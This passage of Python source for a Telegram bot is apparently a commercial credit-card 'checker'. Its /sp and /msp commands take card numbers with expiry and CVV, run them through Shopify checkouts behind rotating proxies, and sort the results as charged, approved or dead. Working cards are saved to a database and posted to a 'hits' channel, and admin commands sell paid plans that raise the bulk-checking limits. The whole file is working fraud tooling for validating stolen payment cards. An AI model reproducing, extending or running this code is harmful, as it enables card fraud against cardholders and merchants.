        try:
            idx = int(arg) - 1
            if 0 <= idx < len(proxies):
                rm = await remove_proxy_by_index(event.sender_id, idx)
                await styled_reply(event, f"{PE} <b>Removed {rm['ip']}:{rm['port']}</b>", emoji_ids=[CE["check"]])
            else: await styled_reply(event, f"{PE} <b>Invalid</b>", emoji_ids=[CE["cross"]])
        except: await styled_reply(event, f"{PE} <b>Invalid</b>", emoji_ids=[CE["cross"]])
    except Exception as e: await event.reply(f"⚠️ Error in /rmpxy: {e}")

# ====================== SINGLE CHECK (/sp) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]sp\b'))
async def single_cc_check(event):
    try:
        if not await force_join_check(event): return
        uid = event.sender_id
        is_allowed, at = await can_use(uid, event.chat)
        if at == "banned":
            t, e = banned_user_message()
            return await styled_reply(event, t, emoji_ids=e)
            
        plan = await get_user_plan(uid)
        is_group = event.chat.id != uid
        if not await _check_free_limits(event, uid, plan, is_group): return
        try: sender = await event.get_sender(); username = sender.username or f"user_{uid}"; name = sender.first_name or username
        except: username, name = f"user_{uid}", "User"
        
        sites = await get_github_sites()
        if not sites: return await styled_reply(event, f"{PE} <b>No sites available from GitHub!</b>", emoji_ids=[CE["warn"]])
        
        if is_paid_plan(plan) or uid in ADMIN_ID:
            proxies = await get_all_user_proxies(uid)
        else:
            proxies = []
            for aid in ADMIN_ID:
                proxies = await get_all_user_proxies(aid)
                if proxies: break

        proxies.extend(get_txt_proxies())
        proxies = list({p['proxy_url']: p for p in proxies if p}.values())

        rm = await event.get_reply_message() if event.reply_to_msg_id else None
        
        content = event.raw_text
        if rm and rm.text: content = rm.text
        cards = extract_cc(content)
        
        if not cards: return await styled_reply(event, f"{PE} <code>/sp card|mm|yy|cvv</code>", emoji_ids=[CE["info"]])
        card = cards[0]
        
        if uid not in ADMIN_ID and not is_paid_plan(plan): 
            set_free_sp_last_use(uid); increment_free_sp_usage(uid)
            
        lm = await styled_reply(event, f"Processing… ⏳")
        st = time.time()
        
        try:
            session = await get_user_http_session(uid, "sp")
            bin_task = asyncio.create_task(get_bin_info(card.split('|')[0]))
            result = await check_card_with_retry(card, sites, proxies=proxies, session=session, max_retries=3)
            bi = await bin_task
                
            elapsed = round(time.time() - st, 2)
            status = result.get('status', 'Dead')
            
            msg, eid = format_card_result(status, card, result.get('gateway', 'Shopify'), result.get('message', '')[:150], result.get('price', '-'), bi, elapsed)
            
            try: await lm.delete()
            except: pass
            
            gif_io = await fetch_random_gif() if status in ["Charged", "Approved"] else None
            sent = False
            if gif_io:
                try:
                    await styled_reply(event, msg, emoji_ids=eid, buttons=HIT_BUTTON, file=gif_io)
                    sent = True
                except Exception: pass
            
            if not sent:
                await styled_reply(event, msg, emoji_ids=eid, buttons=HIT_BUTTON)

            if status in ["Charged", "Approved"]:
                asyncio.create_task(save_card_to_db(card, status.upper(), result.get('message', ''), result.get('gateway', 'Shopify'), result.get('price', '-')))
                asyncio.create_task(send_channel_hit(result, uid, username, name, result.get('gateway', 'Shopify'), status))
                
        except Exception as inner_e:
            try: await lm.delete()
            except: pass
            await styled_reply(event, f"{PE} <b>Error:</b> <code>{inner_e}</code>", emoji_ids=[CE["cross"]])
    except Exception as e: await event.reply(f"⚠️ Error in /sp: {e}")

# ====================== MASS CHECK (/msp) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]stop$'))
async def stop_cmd(event):
    uid = event.sender_id
    if uid in ACTIVE_MTXT_PROCESSES:
        ACTIVE_MTXT_PROCESSES[uid]["stopped"] = True
        for t in ACTIVE_MTXT_PROCESSES[uid].get("tasks", []):
            if not t.done(): t.cancel()
        await styled_reply(event, f"{PE} <b>Stopping...</b>", emoji_ids=[CE["stop"]])
    else:
        await styled_reply(event, f"{PE} <b>No active session</b>", emoji_ids=[CE["warn"]])

async def _send_mass_hit(card, status, message, price, gateway, uid, username, name):
    await asyncio.sleep(HIT_DELAY)
    try:
        bi = await get_bin_info(card.split("|")[0])
        msg, eid = format_card_result(status, card, gateway, message[:150], price, bi, 0.0)
        
        gif_io = await fetch_random_gif() if status in ["Charged", "Approved"] else None
        sent = False
        if gif_io:
            try:
                await styled_send(uid, msg, emoji_ids=eid, buttons=HIT_BUTTON, file=gif_io)
                sent = True
            except: pass
            
        if not sent:
            await styled_send(uid, msg, emoji_ids=eid, buttons=HIT_BUTTON)
            
        if status in ["Charged", "Approved"]:
            res_dict = {"card": card, "message": message, "price": price}
            asyncio.create_task(send_channel_hit(res_dict, uid, username, name, gateway, status))
    except: pass

async def send_final_results(uid, total, charged, approved, declined, errors, all_results):
    summary = f"""✨ <b>Results Complete</b> ✨
━━━━━━━━━━━━━━━━━
💳 Total: {total} | ✅ Charged: {charged} | ⚡ Live: {approved} | ❌ Dead/Error: {declined + errors}
━━━━━━━━━━━━━━━━━"""
    filename = f"shopiii_{uid}_{int(time.time())}.txt"
    try:
        async with aiofiles.open(filename, 'w', encoding='utf-8') as f:
            await f.write("=" * 70 + "\n✨ CC CHECKER RESULTS ✨\nFormat: CC | Gateway | Price | Message\n" + "=" * 70 + "\n\n")
            
            await f.write(f"✅ CHARGED ({len(all_results['charged'])}):\n" + "-" * 70 + "\n")
            for r in all_results['charged']: 
                await f.write(f"{r['card']} | {r.get('gateway', 'Shopify')} | {r.get('price', '-')} | {str(r['message'])[:100]}\n")
            
            await f.write(f"\n⚡ APPROVED ({len(all_results['approved'])}):\n" + "-" * 70 + "\n")
            for r in all_results['approved']: 
                await f.write(f"{r['card']} | {r.get('gateway', 'Shopify')} | {r.get('price', '-')} | {str(r['message'])[:100]}\n")
            
            await f.write(f"\n❌ DEAD/ERROR ({len(all_results['dead'])}):\n" + "-" * 70 + "\n")
            for r in all_results['dead']: 
                await f.write(f"{r['card']} | {r.get('gateway', 'Shopify')} | {r.get('price', '-')} | {str(r['message'])[:100]}\n")

        await styled_send(uid, summary, file=filename)
    except: pass
    finally:
        try: os.remove(filename)
        except: pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]msp\b'))
async def mass_check_cmd(event):
    try:
        if not await force_join_check(event): return
        uid = event.sender_id
        is_allowed, at = await can_use(uid, event.chat)
        if at == "banned": return await styled_reply(event, *banned_user_message())
            
        plan = await get_user_plan(uid)
        if uid not in ADMIN_ID and not is_paid_plan(plan): return await send_premium_only_message(event)
        cl = get_cc_limit(plan, uid)
        
        if uid in ACTIVE_MTXT_PROCESSES: return await styled_reply(event, f"{PE} <b>Already running!</b>", emoji_ids=[CE["warn"]])
        
        content = ""
        if event.reply_to_msg_id:
            rm = await event.get_reply_message()
            if rm.document:
                fp = await rm.download_media()
                if fp:
                    try:
                        async with aiofiles.open(fp, 'r', encoding='utf-8', errors='ignore') as f: content = await f.read()
                        os.remove(fp)
                    except: pass
            elif rm.text: content = rm.text
        else: 
            parts = event.raw_text.split(maxsplit=1)
            if len(parts) > 1: content = parts[1]
            else: return await styled_reply(event, f"{PE} <b>Reply to .txt or paste cards after </b><code>/msp</code>", emoji_ids=[CE["info"]])
        
        sites = await get_github_sites()
        if not sites: return await styled_reply(event, f"{PE} <b>No sites available from GitHub!</b>", emoji_ids=[CE["warn"]])
        
        proxies = await get_all_user_proxies(uid)
        proxies.extend(get_txt_proxies())
        proxies = [p['proxy_url'] for p in proxies if p]

        cards = extract_cc(content)
        if not cards: return await styled_reply(event, f"{PE} <b>No valid cards</b>", emoji_ids=[CE["cross"]])
        if len(cards) > cl: cards = cards[:cl]
        
        sm = await styled_reply(event, f"<pre>{PE} Starting mass check: {len(cards)} CCs</pre>", emoji_ids=[CE["star"]])
        
        ACTIVE_MTXT_PROCESSES[uid] = {"stopped": False, "tasks": []}
        
        try: sender = await event.get_sender(); username, name = sender.username or f"user_{uid}", sender.first_name or "User"
        except: username, name = f"user_{uid}", "User"

        all_results = {'charged': [], 'approved': [], 'dead': []}
        checked = charged = approved = declined = errors = 0
        total = len(cards)
        st = time.time()
        lcd = lrd = "-"
        last_ui = 0
        
        session = await get_user_http_session(uid, "msp")
        queue = asyncio.Queue()
        for c in cards: queue.put_nowait(c)
        
        async def worker():
            nonlocal checked, charged, approved, declined, errors, lcd, lrd, last_ui
            while not queue.empty() and not ACTIVE_MTXT_PROCESSES.get(uid, {}).get("stopped", True):
                try: card = queue.get_nowait()
                except asyncio.QueueEmpty: break
                
                try:
                    res = await check_card_with_retry(card, sites, proxies, session, max_retries=3)
                    status = res.get('status', 'Dead')
                    message = res.get('message', 'Error')
                    gateway = res.get('gateway', 'Shopify')
                    price = res.get('price', '-')
                    
                    checked += 1
                    lcd = card
                    lrd = message[:30]
                    
                    if status == 'Charged':
                        charged += 1
                        all_results['charged'].append(res)
                        asyncio.create_task(save_card_to_db(card, "CHARGED", message, gateway, price))
                        asyncio.create_task(_send_mass_hit(card, "Charged", message, price, gateway, uid, username, name))
                    elif status == 'Approved':
                        approved += 1
                        all_results['approved'].append(res)
                        asyncio.create_task(save_card_to_db(card, "APPROVED", message, gateway, price))
                        asyncio.create_task(_send_mass_hit(card, "Approved", message, price, gateway, uid, username, name))
                    elif status == 'Site Error':
                        errors += 1
                        all_results['dead'].append(res)
                    else:
                        declined += 1
                        all_results['dead'].append(res)
                        
                    queue.task_done()
                    
                    # Update UI safely
                    now = time.time()
                    if now - last_ui > 3.0:
                        last_ui = now
                        kb = [
                            [pbtn(f"💳 {lcd}", "none")],
                            [pbtn(f"✅ Charged: {charged}", "none"), pbtn(f"⚡ Approved: {approved}", "none")],
                            [pbtn(f"❌ Declined: {declined}", "none"), pbtn(f"⚠️ Errors: {errors}", "none")],
                            [pbtn(f"📊 Checked: {checked} / {total}", "none")],
                            [pbtn("🛑 Stop Check", f"stop_chk:{uid}")]
                        ]
                        try: await styled_edit(sm, f"<pre>{PE} Processing...</pre>", buttons=kb, emoji_ids=[CE["star"]])
                        except: pass
                        
                except Exception as e:
                    queue.task_done()
                    errors += 1
                    checked += 1
                    all_results['dead'].append({'card': card, 'message': str(e), 'gateway': 'Shopify', 'price': '-'})
        
        workers = [asyncio.create_task(worker()) for _ in range(WORKERS)]
        ACTIVE_MTXT_PROCESSES[uid]["tasks"] = workers
        
        await asyncio.gather(*workers, return_exceptions=True)
        
        el = int(time.time() - st); h, m, s = el // 3600, (el % 3600) // 60, el % 60
        is_stopped = ACTIVE_MTXT_PROCESSES.get(uid, {}).get("stopped", False)
        stop_label = " (Stopped)" if is_stopped else ""
        
        ft = f"""{PE} <b>Complete{stop_label}</b> {PE}
━━━━━━━━━━━━━━━━━
{PE} <b>Charged</b> ━ <code>{charged}</code>
{PE} <b>Approved</b> ━ <code>{approved}</code>
{PE} <b>Declined</b> ━ <code>{declined}</code>
{PE} <b>Errors</b> ━ <code>{errors}</code>
━━━━━━━━━━━━━━━━━
{PE} <b>Checked</b> ━ <code>{checked}/{total}</code>"""

        fkb = [
            [pbtn(f"✅ Charged: {charged}", "none"), pbtn(f"⚡ Approved: {approved}", "none")],
            [pbtn(f"📊 Total: {checked}/{total}", "none"), pbtn(f"⏱ {h}h {m}m {s}s", "none")]
        ]
        
        for _ in range(3):
            try: await styled_edit(sm, ft, buttons=fkb, emoji_ids=[CE["crown"], CE["crown"], CE["gem"], CE["check"], CE["declined"], CE["warn"], CE["star"]]); break
            except: await asyncio.sleep(0.5)
            
        await send_final_results(uid, total, charged, approved, declined, errors, all_results)
        ACTIVE_MTXT_PROCESSES.pop(uid, None)
        
    except Exception as e: await event.reply(f"⚠️ Error in /msp: {e}")

@client.on(events.CallbackQuery(pattern=rb"stop_chk:(\d+)"))
async def stop_chk_cb(event):
    puid = int(event.pattern_match.group(1).decode())
    if event.sender_id != puid and event.sender_id not in ADMIN_ID: return await event.answer("Not yours!", alert=True)
    proc = ACTIVE_MTXT_PROCESSES.get(puid)
    if not proc: return await event.answer("None active!", alert=True)
    proc["stopped"] = True
    for t in proc.get("tasks", []):
        if not t.done(): t.cancel()
    await event.answer("Stopping...", alert=True)

# ====================== COMMANDS (ADMIN) ======================
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan1\b'))
async def plan1_cmd(event): await _handle_plan_assign(event, "plan1")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan2\b'))
async def plan2_cmd(event): await _handle_plan_assign(event, "plan2")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan3\b'))
async def plan3_cmd(event): await _handle_plan_assign(event, "plan3")
@client.on(events.NewMessage(pattern=r'(?i)^[/.]plan4\b'))
async def plan4_cmd(event): await _handle_plan_assign(event, "plan4")

async def _handle_plan_assign(event, plan_key):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) < 2: return await styled_reply(event, f"{PE} <code>/{plan_key} user_id</code>", emoji_ids=[CE["warn"]])
    try: target_uid = int(parts[1])
    except: return await styled_reply(event, f"{PE} <b>Invalid ID</b>", emoji_ids=[CE["cross"]])
    pi = PLANS[plan_key]
    try: target_entity = await client_instance.get_entity(target_uid); target_name = getattr(target_entity, 'first_name', None) or "Unknown"
    except: target_name = "Unknown"
    await ensure_user(target_uid)
    current_plan = await get_user_plan(target_uid); is_upgrade = is_paid_plan(current_plan)
    await set_user_plan(target_uid, pi["tier"], pi["duration_days"])
    expiry_date = (datetime.now() + timedelta(days=pi["duration_days"])).strftime('%Y-%m-%d %H:%M:%S')
    
    # 🌟 هنا الرد الواحد فقط للمشرف
    await styled_reply(event, f"""<b>✅ Plan Updated</b>\n<a href='https://t.me/Dddadddyttt'>⊀</a> <b>User</b> ↬ <a href='tg://user?id={target_uid}'>{target_name}</a>\n<a href='https://t.me/Dddadddyttt'>⊀</a> <b>Plan</b> ↬ {pi['emoji']} <b>{pi['name']}</b>\n<a href='https://t.me/Dddadddyttt'>⊀</a> <b>Duration</b> ↬ <code>{pi['duration_days']} days</code>\n<a href='https://t.me/Dddadddyttt'>⊀</a> <b>Expires</b> ↬ <code>{expiry_date}</code>""")
    
    try: await styled_send(target_uid, f"""<b>🎉 Plan Upgraded! 🎉</b>\n{pi['emoji']} <b>{pi['name']}</b> ━ <code>{pi['duration_days']}d</code>\nLimit: {get_cc_limit(pi['tier'])} CCs\nExpires: {expiry_date}""")
    except: pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]rplan\b'))
async def rplan_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    parts = event.raw_text.split()
    if len(parts) < 2: return await styled_reply(event, f"{PE} <code>/rplan user_id</code>", emoji_ids=[CE["warn"]])
    try: target_uid = int(parts[1])
    except: return await styled_reply(event, f"{PE} <b>Invalid</b>", emoji_ids=[CE["cross"]])
    await ensure_user(target_uid)
    cp = await get_user_plan(target_uid)
    if not is_paid_plan(cp): return await styled_reply(event, f"{PE} <b>No active plan</b>", emoji_ids=[CE["cross"]])
    try: ent = await client_instance.get_entity(target_uid); tn = getattr(ent, 'first_name', None) or "?"
    except: tn = "?"
    await set_user_plan(target_uid, "Bronze", 0)
    await styled_reply(event, f"{PE} <b>Revoked {cp} from {tn}</b>", emoji_ids=[CE["check"]])
    try: await styled_send(target_uid, f"{PE} <b>Your plan has been ended. Contact admin to renew.</b>", emoji_ids=[CE["warn"]])
    except: pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]planall$'))
async def planall_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    all_users = []
    try:
        async with DB_LOCK_MAIN:
            with open("database.json", "r", encoding="utf-8") as f:
                ddata = json.load(f)
                for uid_s, u_doc in ddata.get("users", {}).items():
                    if u_doc.get("plan") in PAID_TIERS: all_users.append(u_doc)
    except: pass
    if not all_users: return await styled_reply(event, f"{PE} <b>No active plans</b>", emoji_ids=[CE["warn"]])
    fn = f"plans_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    content = f"ACTIVE PLANS ({len(all_users)})\n{'='*40}\n"
    for u in all_users:
        uid2 = u.get("user_id", "?"); tier = u.get("plan", "?"); exp_s = u.get("expiry")
        exp = datetime.fromisoformat(exp_s) if exp_s else None
        es = exp.strftime('%Y-%m-%d') if exp else "?"
        try: ent = await client_instance.get_entity(uid2); un = getattr(ent, 'first_name', None) or "?"
        except: un = "?"
        content += f"{un} | {uid2} | {tier} | {es}\n"
    async with aiofiles.open(fn, 'w') as f: await f.write(content)
    try: await styled_send(event.chat_id, f"{PE} <b>Plans ({len(all_users)})</b>", emoji_ids=[CE["fire"]], file=fn)
    except: pass
    try: os.remove(fn)
    except: pass

@client.on(events.NewMessage(pattern=r'(?i)^[/.]stats$'))
async def stats_cmd(event):
    if event.sender_id not in ADMIN_ID: return
    try:
        tu = await get_total_users(); pu = await get_premium_count()
        ts2 = len(_CACHED_SITES) if _CACHED_SITES else 0 
        tc = await get_total_cards_count()
        ch = await get_charged_count(); ap = await get_approved_count()
        await styled_reply(event, f"""{PE} <b>Stats</b> {PE}\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>Users:</b> <code>{tu}</code> | <b>Premium:</b> <code>{pu}</code>\n{PE} <b>Sites (GitHub):</b> <code>{ts2}</code> | <b>Cards:</b> <code>{tc}</code>\n{PE} <b>Charged:</b> <code>{ch}</code> | <b>Approved:</b> <code>{ap}</code>\n<b>━━━━━━━━━━━━━━━━━</b>\n{PE} <b>MSP Active:</b> <code>{len(ACTIVE_MTXT_PROCESSES)}</code> ({WORKERS}w)""", emoji_ids=[CE["fire"], CE["fire"], CE["chart"], CE["link"], CE["gem"], CE["brain"], CE["shield"]])
    except Exception as e: await styled_reply(event, f"{PE} <b>Error:</b> <code>{e}</code>", emoji_ids=[CE["cross"]])

# ====================== MAIN LOOP ======================
async def main():
    global client_instance
    client_instance = client
    log_system("BOOT", "Initializing database...")
    await init_db()
    
    log_system("BOOT", "Cleaning up Telegram Webhooks (Anti-Ghost)...")
    try:
        async with aiohttp.ClientSession() as session:
            url = f"https://api.telegram.org/bot{BOT_TOKEN}/deleteWebhook?drop_pending_updates=true"
            async with session.get(url) as resp:
                result = await resp.json()
                print(f"🚨 [WEBHOOK CLEANUP]: {result}")
    except Exception as e: print(f"🚨 [WEBHOOK CLEANUP ERROR]: {e}")

    log_system("BOOT", "Fetching sites from GitHub...")
    await get_github_sites()

    while True:
        try:
            log_system("BOOT", "Starting bot...")
            await client.start(bot_token=BOT_TOKEN)
            log_system("BOOT", "✅ Bot Started!")
            await client.run_until_disconnected()
        except FloodWaitError as e:
            log_system("FLOOD", f"Sleeping {e.seconds+5}s", "warning")
            await asyncio.sleep(e.seconds + 5)
        except Exception as e:
            log_system("CRASH", f"{e}", "error")
            await asyncio.sleep(10)

if __name__ == "__main__":
    asyncio.run(main())
